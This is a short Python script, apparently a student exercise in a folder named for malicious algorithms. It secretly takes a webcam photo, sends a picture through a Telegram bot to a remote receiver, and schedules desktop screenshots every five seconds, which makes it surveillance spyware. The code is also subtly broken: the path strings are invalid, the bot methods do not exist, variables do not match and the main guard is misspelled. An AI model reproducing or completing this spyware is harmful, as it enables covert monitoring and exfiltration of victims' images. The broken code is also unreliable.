import time
import cv2
import pyscreenshot as ImageGrab
import schedule
import telepot
import token 
import receiver_id 
import filepath 
from datetime import datetime


cap = cv2.VideoCapture(0)
ret, frame = cap.read()
cv2.imwrite('C:\Users\juanm\OneDrive\Desktop\Malware\Algoritmos-maliciosos', frame)   
cap.release()
bot = telepot.Bot(token)
bot.notifyMessage(receiver_id, 'Picture Taken.') #enviar notificacion al usuario
bot.sendPicture(receiver_id, photo=open('SCREENSHOT', 'rb'))

def take_screenshot():
    print("Taking screenshot...")

    image_name = f"screenshot-{str(datetime.now())}"
    screenshot = ImageGrab.grab()

    filepathloc = f"C:\Users\juanm\OneDrive\Desktop\Malware\Algoritmos-maliciosos\malware.jpeg"

    screenshot.save(filepath)

    print("Screenshot taken...")

    return filepath


def Main():
    schedule.every(5).seconds.do(take_screenshot)

    while True:
        schedule.run_pending()
        time.sleep(1)


if __name__ == '__Main__':
    Main()